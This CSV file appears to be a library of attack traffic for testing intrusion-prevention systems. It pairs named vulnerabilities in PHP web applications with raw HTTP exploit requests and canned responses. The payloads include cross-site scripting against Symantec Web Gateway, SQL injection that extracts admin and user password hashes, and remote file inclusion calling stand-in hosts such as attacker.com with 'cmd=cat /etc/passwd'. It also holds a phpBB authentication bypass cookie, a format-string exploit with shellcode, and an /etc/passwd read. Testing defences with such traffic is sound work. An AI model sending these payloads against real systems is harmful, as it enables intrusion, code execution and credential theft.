XmlName,ExecDesc,EngDesc,Protocol,SPECProtocol,Payload
TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS,TCP,"GET /spywall/repairedclients.php?filter_date_period=&variable[]=action&operator[]=%27,%271%27,%27%27)||3B ||%20alert(%22TELUS%22)||3B ||(%27 HTTP/1.1||0D 0A ||Host||3A || 172.16.8.1||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 6.1||3B || rv||3A ||18.0) Gecko/20100101 Firefox/18.0||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||Accept-Language||3A || en-US,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Referer||3A || http||3A ||//172.16.1.2/~arezouh/Symantec/WebGateway/poc.html||0D 0A ||Cookie||3A || PHPSESSID=9c0e622c9918ad00fdf94498aff73f3b||0D 0A ||Connection||3A || keep-alive||0D 0A 0D 0A||"
TSL20140618-11_Symantec_Web_Gateway_Multiple_PHP_Pages_Cross_Site_Scripting.xml,Symantec Web Gateway Multiple PHP Pages Cross Site Scripting,"A cross-site scripting vulnerability exists in Symantec Web Gateway. The vulnerability is due to improper validation of &quot;variable[]&quot;, &quot;operator[]&quot;, &quot;other[]&quot; and &quot;operand[]&quot; parameters of several php pages including but not limited to &quot;entSummary.php&quot;, &quot;custom_report.php&quot;, &quot;host_spy_report.php&quot;  An attacker can exploit this vulnerability by enticing a user to click on a malicious link. A successful attack will result in execution of arbitrary script code in the context of the affected user's browser session.and &quot;repairedclients.php&quot; pages. ",HTTP/HTTPS,TCP,"HTTP/1.1 200 OK||0D 0A ||Date||3A || Thu, 17 Jul 2014 18||3A ||12||3A ||11 GMT||0D 0A ||Server||3A || Apache/2.2.3 (CentOS) PHP/5.1.6 mod_python/3.2.8 Python/2.4.3 mod_perl/2.0.4 Perl/v5.8.8||0D 0A ||Last-Modified||3A || Thu, 17 Jul 2014 18||3A ||11||3A ||57 GMT||0D 0A ||ETag||3A || ||22 ||248c66-335-4fe6793869540||22 0D 0A ||Accept-Ranges||3A || bytes||0D 0A ||Content-Length||3A || 821||0D 0A ||Keep-Alive||3A || timeout=15, max=100||0D 0A ||Connection||3A || Keep-Alive||0D 0A ||Content-Type||3A || text/html||3B || charset=ISO-8859-1||0D 0A 0D 0A ||<html>||0D 0A ||<body>||0D 0A ||<script>||0D 0A ||    function goTo(url, link){||0D 0A ||        name = document.getElementById(||22 ||servername||22 ||).value||3B 0D 0A ||        document.getElementById(||22 ||link||22 || + link).href = ||22 ||http||3A ||//||22 || + name + url||3B 0D 0A ||        //alert(document.getElementById(||22 ||link||22 || + link).href)||3B 0D 0A ||    }||0D 0A ||</script>||0D 0A ||<p><h2>TELUS Security Labs Proof of Concept<br>||0D 0A ||All Rights Reserved</h2>||0D 0A ||</p>||0D 0A 0D 0A ||<div>Enter the Symantec Web Gateway Management Console hostname (Ex||3A || symantec-gateway.company.com or 192.168.254.254)||3A || <input id=||22 ||servername||22 ||></input></div>||0D 0A 0D 0A ||<div>||0D 0A ||<br><b>Click one of the following links to demonstrate the vulnerability||3A ||</b>||0D 0A ||<br><a id=||22 ||link1||22 || herf=||22 22 || onclick=||22 ||goTo('/spywall/repairedclients.php?filter_date_period=&variable[]=action&operator[]=%27,%271%27,%27%27)||3B || alert(%22TELUS%22)||3B ||(%27', 1)||22 ||>spywall XSS </a>||0D 0A ||</div>||0D 0A ||</body>||0D 0A ||</html>||0D 0A||"
﻿TSL20140630-07_PHP_unserialize_Call_SPL_ArrayObject_and_SPLObjectStorage_Memory_Corruption.xml,PHP unserialize Call SPL ArrayObject and SPLObjectStorage Memory Corruption,A memory corruption vulnerability exists in PHP. The vulnerability is due to type confusion in the unserialize() function for SPL ArrayObject and SPLObjectStorage. An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,HTTP/HTTPS,TCP,"POST /poc.php HTTP/1.1||0D 0A ||Host||3A || 172.16.8.176||0D 0A ||User-Agent||3A || Mozilla/5.0 (Windows NT 5.1||3B || rv||3A ||30.0) Gecko/20100101 Firefox/30.0||0D 0A ||Accept||3A || text/html,application/xhtml+xml,application/xml||3B ||q=0.9,*/*||3B ||q=0.8||0D 0A ||Accept-Language||3A || en-US,en||3B ||q=0.5||0D 0A ||Accept-Encoding||3A || gzip, deflate||0D 0A ||Referer||3A || http||3A ||//172.16.8.176/poc.php||0D 0A ||Connection||3A || keep-alive||0D 0A ||Content-Type||3A || application/x-www-form-urlencoded||0D 0A ||Content-Length||3A || 132||0D 0A 0D 0A ||string=x%3Ai%3A2%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%2CN%3B%3BO%3A8%3A%22stdClass%22%3A0%3A%7B%7D%2CN%3B%3Bm%3As%3A10%3AAAAAAAAAAA"
TSL20140630-07_PHP_unserialize_Call_SPL_ArrayObject_and_SPLObjectStorage_Memory_Corruption.xml,PHP unserialize Call SPL ArrayObject and SPLObjectStorage Memory Corruption,A memory corruption vulnerability exists in PHP. The vulnerability is due to type confusion in the unserialize() function for SPL ArrayObject and SPLObjectStorage. An attacker can exploit this vulnerability if the application uses the vulnerable function. A successful attack can allow arbitrary code execution in the context of the PHP application. An unsuccessful attack will result in a denial of service condition.,HTTP/HTTPS,TCP,"HTTP/1.0 500 Internal Server Error||0D 0A ||Date||3A || Fri, 05 Sep 2014 17||3A ||53||3A ||43 GMT||0D 0A ||Server||3A || Apache/2.2.15 (CentOS)||0D 0A ||X-Powered-By||3A || PHP/5.3.3||0D 0A ||Content-Length||3A || 0||0D 0A ||Connection||3A || close||0D 0A ||Content-Type||3A || text/html||3B || charset=UTF-8||0D 0A 0D 0A||"
﻿exophpdesk_rfi.xml,ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. ExoPHPDesk is a web application that typically listens on port 80.,HTTP,TCP,"GET /faq.php?action=&type=view&s=&id=-1'%20union%20select%200,concat(char(85),char(115),char(101),char(114),char(110),char(97),char(109),char(101),char(58),name,char(32),char(124),char(124),char(32),char(80),char(97),char(115),char(115),char(119),char(111),char(114),char(100),char(58),pass),0,0,0,0,0%20from%20phpdesk_admin/* HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||"
exophpdesk_rfi.xml,ExoPHPDesk <= 1.2.1 (faq.php) Remote SQL Injection Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. ExoPHPDesk is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿fully_modded_phpbb2_rfi.xml,Fully Modded phpBB2 Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Fully Modded phpBB2 is a web application that typically listens on port 80.,HTTP,TCP,GET /faq.php?foing_root_path=http||3A ||//shell.com/shell.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || msnbot/1.0||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
fully_modded_phpbb2_rfi.xml,Fully Modded phpBB2 Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.Fully Modded phpBB2 is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿mobilepublisherphp_rfi.xml,MobilePublisherPHP Header.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MobilePublisherPHP is a web application that typically listens on port 80.,HTTP,TCP,GET /header.php?abspath=http||3A ||//site.com/shell.php? HTTP/1.1||0D 0A ||Host||3A || www.example.com||0D 0A ||Accept||3A || */*||0D 0A ||User-Agent||3A || eLinks/2.6 (Linux||3B || 80x22)||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
mobilepublisherphp_rfi.xml,MobilePublisherPHP Header.PHP Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MobilePublisherPHP is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿myphpcms_rfi.xml,MyPHP CMS File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MyPHP CMS is a web application that typically listens on port 80,HTTP,TCP,GET /styles/default/global_header.php?installed=23domain=http||3A ||//attacker.com/cmd.txt?cmd=cat /etc/passwd HTTP/1.0||0D 0A ||host||3A || www.victim.com||0D 0A ||User-Agent||3A || Mozilla/4.0 (compatible||3B || MSIE 6.0||3B || Windows NT 5.1)||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
myphpcms_rfi.xml,MyPHP CMS File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.MyPHP CMS is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿php3_format.xml,PHP Format String Attack,This threat attempts to execute code on a server running PHP by taking advantage of a improperly used logging function which allows a user to write to an arbitrary address.  The shellcode included will attempt to write a file to /tmp/BADPHP.,HTTP,TCP,POST index.php HTTP/1.0||0A ||Content-Type||3A ||multipart/form-data %55817X%X%X%hnd||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF ||d||DC FF BF 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 BA ||I||FE FF FF F7 D2 B9 BF FF FF FF F7 D1 E8 FF FF FF FF C0 ||[j||16 ||X||03 D8 ||3||C0 88 ||C||0B 83 C0 05 CD 80 ||3||C0 ||@||CD 80 ||/tmp/BADPHP||CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC CC 0A 0A||
php3_format.xml,PHP Format String Attack,This threat attempts to execute code on a server running PHP by taking advantage of a improperly used logging function which allows a user to write to an arbitrary address.  The shellcode included will attempt to write a file to /tmp/BADPHP.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpBBAuthen.xml,phpBB Authentication Bypass,This threat is an attempt to bypass authentication on a phpBB bulletin board application.  This allows a user to use the website as an admin.,HTTP,TCP,GET / HTTP/1.0||0D 0A ||Cookie||3A || phpbb2mysql_data=a%3A2%3A%7Bs%3A11%3A%22autologinid%22%3Bb%3A1%3Bs%3A6%3A%22userid%22%3Bs%3A1%3A%222%22%3B%7D||0D 0A 0D 0A||
phpBBAuthen.xml,phpBB Authentication Bypass,This threat is an attempt to bypass authentication on a phpBB bulletin board application.  This allows a user to use the website as an admin.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpBB_viewtopic.xml,phpBB SQL Injection Attack,This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80.,HTTP,TCP,"GET /phpBB2/viewtopic.php?sid=1&topic_id=-1%20uni%6f%6e%20se%6cec%74%20o%72%64(%73u%62s%74%72%69%6e%67%28%75%73%65r_p%61ss%77%6fr%64,%31%2c1))%20f%72o%6d%20%70%68p%62%62%5fu%73ers%20w%68er%65%20use%72%5f%69%64=2%2f*&view=newest HTTP/1.0||0A 0A ||Cookie||3A || phpBB2mysql_sid=1||0A ||Host||3A || example.com||0A 0A||"
phpBB_viewtopic.xml,phpBB SQL Injection Attack,This threat performs a SQL injection attack against the popular web based bulletin board software phpBB.  This particular attack attempts to retrieve the password hashes of users.  phpBB is a web application and typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpFullannu_rfi.xml,phpFullAnnu <= v5.1 (repmod) Remote File Inclusion Vulnerability ,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.phpFullAnnu is a web application that typically listens on port 80,HTTP,TCP,GET /modules/home.module.php?repmod=http||3A ||//www.shell.com/cmd.txt?&cmd=ls HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpFullannu_rfi.xml,phpFullAnnu <= v5.1 (repmod) Remote File Inclusion Vulnerability ,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server.phpFullAnnu is a web application that typically listens on port 80,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpMyNewsletter_rfi.xml,phpMyNewsLetter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpMyNewsletter is a web application that typically listens on port 80.,HTTP,TCP,GET /include/customize.php?l=http||3A ||//site.com/cmd.txt? HTTP/1.0||0D 0A ||Host||3A || www.site.com||0D 0A ||User-Agent||3A || Googlebot/2.1||0D 0A ||Connection||3A || Close||0D 0A 0D 0A||
phpMyNewsletter_rfi.xml,phpMyNewsLetter Remote File Include Vulnerability,This threat sends a crafted url string that will allow for arbitrary code to be executed on the affected server. phpMyNewsletter is a web application that typically listens on port 80.,HTTP,TCP,HTTP||2f ||1||2e ||1 200 ||4f 4b 0d 0a ||Server||3a || Apache||0d 0a 4c ||ast||2d 4d 6f ||dified||3a || ||4d 6f 6e 2c || 02 Feb 2004 11||3a ||32||3a ||41 G||4d ||T||0d 0a ||ETag||3a || ||22 ||a9d6e||2d ||800||2d ||3d25cf1854840||22 0d 0a ||Accept||2d ||Ra||6e ||ges||3a || bytes||0d 0a ||C||6f 6e ||te||6e ||t||2d 4c ||e||6e ||gth||3a || 5||0d 0a 4b ||eep||2d ||A||6c ||ive||3a || ti||6d ||e||6f ||ut||3d ||15||2c || ||6d ||ax||3d ||100||0d 0a ||C||6f 6e 6e ||ecti||6f 6e 3a || ||4b ||eep||2d ||A||6c ||ive||0d 0a ||C||6f 6e ||te||6e ||t||2d ||Type||3a || text||2f ||p||6c ||ai||6e 0d 0a 0d 0a ||Pw||6e ||T!
﻿phpMyVisitesFileRead.xml,phpMyVisites Arbitrary File Reading,This threat takes advantage of a form submission that will set a cookie which allows an attacker to read an arbitrary file off of the system.  This allows the attacker to learn more about the system for further attacks or read sensitive information.  phpMyVisites is a PHP script which will typically run on a webserver listening on port 80.,HTTP,TCP,POST /phpMyVisites/login.php HTTP/1.0||0A ||Content-Type||3A || application/x-www-form-urlencoded||0A ||Content-Length||3A || 22||0A 0A ||mylang=%2Fetc%2Fpasswd||0A||
